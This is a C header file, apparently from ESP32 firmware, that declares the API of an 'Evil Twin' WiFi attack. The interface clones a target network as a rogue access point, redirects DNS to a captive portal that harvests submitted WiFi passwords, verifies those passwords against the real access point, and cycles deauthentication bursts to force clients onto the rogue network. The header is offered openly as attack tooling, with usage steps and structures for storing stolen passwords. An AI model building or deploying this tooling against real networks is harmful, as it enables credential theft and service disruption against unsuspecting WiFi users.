/*
 * attack_eviltwin.h - Evil Twin Attack with Captive Portal
 *
 * Creates a rogue AP that mimics a target network, then:
 *   1. Starts a DNS server that redirects all queries to the ESP32
 *   2. Serves a captive portal login page from SPIFFS
 *   3. Captures WiFi passwords submitted through the portal
 *   4. Optionally verifies captured passwords against the real AP
 *   5. Cycles deauth attacks to force clients onto the rogue AP
 *
 * SPIFFS files required:
 *   /spiffs/evil_twin/index.html          - Login portal page
 *   /spiffs/evil_twin/wrong.html          - Wrong password page
 *
 * If SPIFFS files are missing, built-in fallback HTML is used.
 *
 * Usage:
 *   attack_eviltwin_init();                              // one-time init
 *   attack_eviltwin_start(ssid, channel, bssid);         // start attack
 *   attack_eviltwin_stop();                              // stop attack
 *   attack_eviltwin_get_captured_passwords(...)          // get results
 */

#ifndef ATTACK_EVILTWIN_H
#define ATTACK_EVILTWIN_H

#include <stdint.h>
#include <stdbool.h>
#include <stddef.h>
#include "esp_err.h"

#ifdef __cplusplus
extern "C" {
#endif

/* ------------------------------------------------------------------ */
/*  Captured password entry                                             */
/* ------------------------------------------------------------------ */

#define EVILTWIN_MAX_PASSWORDS     32
#define EVILTWIN_MAX_PW_LEN        64
#define EVILTWIN_MAX_SSID_LEN      33

typedef struct {
    char password[EVILTWIN_MAX_PW_LEN];
    bool verified;          /* true if verified against real AP  */
    int  attempt_count;     /* how many times this password was submitted */
} eviltwin_password_entry_t;

/* ------------------------------------------------------------------ */
/*  Configuration                                                       */
/* ------------------------------------------------------------------ */

typedef struct {
    char     ssid[EVILTWIN_MAX_SSID_LEN];   /* target SSID to clone   */
    uint8_t  channel;                        /* target channel         */
    uint8_t  bssid[6];                       /* target BSSID           */
    bool     use_captive_portal;             /* enable captive portal  */
    bool     use_deauth;                     /* cycle deauth + portal  */
    bool     verify_passwords;               /* verify against real AP */
    int      deauth_interval_sec;            /* seconds between deauth bursts (0=off) */
} eviltwin_config_t;

/* ------------------------------------------------------------------ */
/*  Init / lifecycle                                                    */
/* ------------------------------------------------------------------ */

/**
 * One-time init – initializes SPIFFS and internal state.
 * Call once from app_main() before any start/stop calls.
 */
void attack_eviltwin_init(void);

/**
 * Start the Evil Twin attack.
 * Creates a rogue AP with the target's SSID, starts DNS redirect,
 * and serves the captive portal.
 *
 * @param config  Attack configuration (contents are copied internally).
 */
void attack_eviltwin_start(const eviltwin_config_t *config);

/**
 * Start the Evil Twin attack using a wifi_ap_record_t-style interface.
 * Convenience wrapper that fills eviltwin_config_t for you.
 *
 * @param ssid     Target SSID (max 32 chars)
 * @param channel  Target WiFi channel (1-14)
 * @param bssid    Target BSSID (6 bytes), can be NULL
 */
void attack_eviltwin_start_simple(const char *ssid, uint8_t channel,
                                  const uint8_t *bssid);

/**
 * Stop the Evil Twin attack.
 * Shuts down DNS, captive portal, rogue AP, and deauth.
 */
void attack_eviltwin_stop(void);

/**
 * Returns true if the Evil Twin attack is currently running.
 */
bool attack_eviltwin_is_running(void);

/* ------------------------------------------------------------------ */
/*  Captured passwords                                                  */
/* ------------------------------------------------------------------ */

/**
 * Get the list of captured passwords.
 *
 * @param out_entries  Array to fill (caller-allocated).
 * @param max_entries  Size of the out_entries array.
 * @param out_count    Set to the actual number of entries written.
 * @return ESP_OK on success.
 */
esp_err_t attack_eviltwin_get_captured_passwords(
    eviltwin_password_entry_t *out_entries,
    int max_entries, int *out_count);

/**
 * Get the number of captured passwords so far.
 */
int attack_eviltwin_get_password_count(void);

/**
 * Clear all captured passwords.
 */
void attack_eviltwin_clear_passwords(void);

/* ------------------------------------------------------------------ */
/*  Status / info                                                       */
/* ------------------------------------------------------------------ */

/**
 * Get a JSON string describing the current evil twin status.
 * Includes: running state, target SSID, channel, captured password count,
 * client count, portal hits.
 * Caller must NOT free the returned pointer (static buffer).
 */
const char *attack_eviltwin_get_status_json(void);

/**
 * Get the current attack status as a simple struct.
 */
typedef struct {
    bool     running;
    char     target_ssid[EVILTWIN_MAX_SSID_LEN];
    uint8_t  target_channel;
    int      captured_count;
    int      portal_hits;
    int      clients_connected;
    bool     password_verified;
    char     verified_password[EVILTWIN_MAX_PW_LEN];
} eviltwin_status_t;

void attack_eviltwin_get_status(eviltwin_status_t *out);

#ifdef __cplusplus
}
#endif

#endif /* ATTACK_EVILTWIN_H */
